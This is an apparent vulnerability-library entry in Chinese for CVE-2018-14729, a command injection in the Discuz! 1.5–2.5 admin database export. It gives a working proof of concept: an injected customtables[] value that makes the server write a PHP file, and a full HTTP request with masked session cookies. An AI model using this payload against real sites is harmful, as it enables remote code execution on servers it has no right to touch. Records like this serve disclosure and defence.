---
cve: "CVE-2018-14729"
source: "白阁文库 BaizeSec/bylibrary"
product: "Discuz1.5–2.5"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-14729"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Discuz! 1.5-2.5 命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Admin database export; method=shell; Unix shell syntax; valid formhash/session"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b48125724c3e14d46a9a8567"
entity_id: "ve-b48125724c3e14d46a9a8567"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Admin database export; method=shell; Unix shell syntax; valid formhash/session

- **结论使用边界（1）**：Auth explicit and full request; environment/shell/mysql dump capability not documented。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **来源与引用处置（2）**：Cookie header includes unrelated ECShop and multiple site sessions; scrub/replace。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **证据待核（3）**：Precise Seebug and reporter repo sources; output proof/source sink absent。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! 1.5-2.5 命令执行漏洞

## 影响版本

 **Discuz! 1.5-2.5**

## POC

需要登入后台。


修改的参数

参数`customtables[]`

    customtables%5B%5D=pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #

数据包

    POST /discuz25/admin.php?action=db&operation=export&setup=1 HTTP/1.1
    Host: localhost
    Content-Length: 252
    Cache-Control: max-age=0
    Origin: http://localhost
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://localhost/discuz25/admin.php?action=db&operation=export
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe**************************f5d; ECSCP_ID=e68**********************************355; ECS_ID=b9e**********************************6d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d************************************************************************************J7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=756**********************************************************************************oss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d********************************************************************************1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09
    Connection: close
    
    formhash=0d2eaac0&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #&method=shell&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=181219_u0CC19kJ&exportsubmit=%E6%8F%90%E4%BA%A4


## References
https://paper.seebug.org/763/

https://github.com/FoolMitAh/CVE-2018-14729


---

> 来源：白阁文库 BaizeSec/bylibrary
